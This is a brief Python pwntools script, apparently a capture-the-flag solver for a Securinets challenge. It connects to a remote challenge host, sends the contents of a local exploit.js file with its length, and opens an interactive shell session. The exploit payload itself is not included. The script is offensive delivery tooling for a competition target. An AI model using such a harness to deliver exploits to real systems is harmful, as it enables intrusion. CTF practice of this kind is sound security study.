from pwn import *

p=remote("pwn-14caf623.p1.securinets.tn",9003)

exploit=open("exploit.js").read()
p.sendline(str(len(exploit)))
p.sendline(exploit)

p.interactive()